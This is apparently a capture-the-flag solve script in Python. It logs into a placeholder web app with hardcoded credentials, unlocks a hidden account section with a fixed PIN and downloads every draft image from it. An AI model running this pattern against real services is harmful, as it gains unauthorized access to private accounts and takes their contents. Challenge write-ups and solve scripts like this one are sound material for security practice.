#!/usr/bin/env python3
# fetch_drafts.py — unlock the unlisted section and download every draft image.
import re, requests

BASE = "http://<target>:5000"
s = requests.Session()
s.post(f"{BASE}/login",
       data={"username": "superdiscreetflaguser", "password": "password123"}, timeout=15)

r = s.post(f"{BASE}/account/unlisted/unlock", data={"pin": "9837"},
           timeout=15, allow_redirects=False)
print("unlock:", r.status_code)

r = s.get(f"{BASE}/account/unlisted", timeout=20)
image_paths = set(re.findall(r'src="(/account/unlisted/\d+/image)"', r.text))
print("images:", image_paths)

for p in image_paths:
    rr = s.get(BASE + p, timeout=30)
    fn = p.replace("/", "_") + ".png"
    open(fn, "wb").write(rr.content)
    print(f"saved {fn}: {len(rr.content)} bytes")
